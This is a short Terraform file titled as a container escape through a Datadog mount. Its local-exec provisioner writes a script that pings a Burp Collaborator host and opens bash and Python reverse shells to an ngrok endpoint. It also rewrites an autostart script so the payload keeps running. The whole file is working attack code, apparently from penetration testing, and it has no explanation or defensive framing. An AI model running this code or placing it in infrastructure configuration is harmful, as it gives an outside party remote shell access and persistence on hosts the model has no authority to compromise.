# main.tf - Container Escape via Datadog Mount
resource "null_resource" "container_escape" {
  provisioner "local-exec" {
    command = <<EOT
      # Write escape payload to Datadog mount
      cat > /var/datadog/escape.sh << 'EOF'
      #!/bin/sh
      # Prove execution to Burp Collaborator
      curl -s http://vqpd77dwov67paogbsxfladvbmhd54tt.oastify.com/escape_success 2>/dev/null
      # Connect reverse shell to ngrok
      bash -c 'bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/19850 0>&1' &
      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.eu.ngrok.io",19850));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' &
      EOF
      chmod +x /var/datadog/escape.sh
      
      # Also update autostart.sh for persistence
      cat > /var/datadog/autostart.sh << 'EOF2'
      #!/bin/sh
      curl -s http://vqpd77dwov67paogbsxfladvbmhd54tt.oastify.com/autostart_triggered 2>/dev/null
      /var/datadog/escape.sh
      EOF2
      chmod +x /var/datadog/autostart.sh
      
      echo "Container escape payload deployed to /var/datadog/"
    EOT
  }
}
